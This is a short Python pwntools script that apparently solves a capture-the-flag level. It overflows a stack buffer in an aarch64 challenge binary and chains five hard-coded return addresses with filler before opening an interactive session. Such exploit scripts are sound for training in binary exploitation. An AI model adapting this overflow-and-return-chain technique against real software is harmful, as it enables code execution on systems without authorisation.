from pwn import *
context.arch="aarch64"
# exe_name = "/usr/bin/qemu-aarch64-static"
# eargv = ["/usr/bin/qemu-aarch64-static", "-g", "1234", "/challenge/level-3-0"]
# p = process(executable= exe_name, argv=eargv)
exe_name = "/challenge/run"
p = process(exe_name)
exp= b"A"*(0x3d+8) \
+ 0x4018B0.to_bytes(8, "little") + b"A"*0x128 \
+ 0x4017E0.to_bytes(8, "little") + b"A"*0x138 \
+ 0x401710.to_bytes(8, "little") + b"A"*0x138 \
+ 0x40156C.to_bytes(8, "little") + b"A"*0x138 \
+ 0x401640.to_bytes(8, "little") + b"A"*0x138

p.send(exp)

p.interactive()

